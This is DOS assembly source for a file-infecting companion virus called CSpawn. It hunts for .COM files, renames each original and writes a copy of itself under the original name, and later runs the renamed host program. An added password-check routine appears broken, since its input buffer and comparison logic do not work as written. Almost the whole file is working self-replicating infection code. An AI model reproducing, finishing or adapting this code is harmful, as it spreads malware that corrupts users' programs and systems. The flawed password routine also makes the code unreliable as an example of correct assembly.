.model tiny
.code
        org 100h
CSpawn:
	MOV SP, offset FINISH + 100h
	MOV AH, 4AH
	MOV BX,SP
	MOV CL,4
	SHR BX,CL
	INC BX
	INT 21H
	
	push offset PASSWORD
	call CHK_PASSWORD 

	CLI
	mov     bx,ax                  
	mov     ax,cs                   
	mov     ss,ax                   
	mov     sp,(FINISH - CSpawn) + 200H
	sti                
	push    bx                
	mov     ds,ax                   
	mov     es,ax                  
	mov     ah,1AH                      
	mov     dx,80H                     
	int     21H                
	call    FIND_FILES             
	pop     ax                      
	mov     ah,4CH                    
	int     21H           

FIND_FILES:                
	mov     dx,OFFSET COM_MASK    
	mov     ah,4EH                 
	xor     cx,cx                  
FIND_LOOP:      
	int     21H                
	jc      FIND_DONE               
	call    INFECT_FILE             
	mov     ah,4FH                 
	jmp     FIND_LOOP              
FIND_DONE:      ret                     
	COM_MASK        db      '*.COM',0               

INFECT_FILE:                
	mov     si,9EH                             
	mov     di,OFFSET REAL_NAME    
INF_LOOP:       
	lodsb                         
	stosb                          
	or      al,al                   
	jnz     INF_LOOP                
	mov     WORD PTR [di-2],'N'     
	mov     dx,9EH                
	mov     di,OFFSET REAL_NAME                
	mov     ah,56H                 
	int     21H
	jc      INF_EXIT               

	mov     ah,3CH                 
	mov     cx,2                   
	int     21H
	mov     bx,ax                   
	mov     ah,40H                  
	mov     cx,FINISH - CSpawn      
	mov     dx,OFFSET CSpawn       
	int     21H                
	mov     ah,3EH                 
	int     21H
INF_EXIT:       ret

CHK_PASSWORD:

	mov bp, sp
	mov ax, [bp+4]

	mov ah, 09H
	lea dx, PROMPT
	int 21h

READ:
	mov dx, 06h    
	mov ah, 0ah
	int 21h
	
COMPARE:
	cmp dx, ax
	je execute
	jne exit
	
exit:
    jmp END_PROCEDURE

execute:
	MOV BX,2Ch
	MOV AX,[BX]
	MOV WORD PTR [PARAM_BLK],AX
	MOV AX,CS
	MOV WORD PTR [PARAM_BLK+4],AX
	MOV WORD PTR [PARAM_BLK+8],AX
	MOV WORD PTR [PARAM_BLK+12],AX

	MOV DX,offset REAL_NAME
	MOV BX,offset PARAM_BLK
	MOV AX,4B00h
	INT 21h
	jmp END_PROCEDURE

END_PROCEDURE: ret
	
	REAL_NAME       db      13 dup (?)             
	PROMPT db 10,13, 'Enter password: $'
	PASSWORD dw 'secretPassword'
        PARAM_BLK       DW      ?                      
                	DD      80H                    
	                DD      5CH                    
        	        DD      6CH                    
FINISH:
	end     CSpawn
